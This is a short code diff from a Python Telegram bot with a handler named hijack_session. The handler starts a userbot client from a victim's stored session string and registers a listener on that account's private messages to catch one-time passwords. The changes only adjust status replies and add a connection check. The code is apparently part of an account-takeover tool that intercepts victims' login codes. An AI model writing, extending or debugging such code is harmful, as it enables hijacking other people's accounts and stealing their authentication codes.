@@ -199,13 +199,16 @@ async def hijack_session(_, message):
 
     session_string = user_session["session_string"]
 
-    await message.reply("✅ User found! Listening for OTP...")
+    await message.reply("✅ User found!")
     #otp_listeners[user_id] = admin_id
 
     try:
         otp_userbot = Client(f"userbot_{user_id}", api_id, api_hash, session_string=session_string)
         await otp_userbot.start()
-        await message.reply("🤖 Bot is now active and ready!")
+        if otp_userbot.is_connected:
+            await message.reply("🤖 Userbot is now active and ready! to Listen for OTP...")
+        else:
+            await message.reply("❌ OTP Userbot failed to start.")
         
         @otp_userbot.on_message(filters.private)
         async def otp_listener(_, msg):
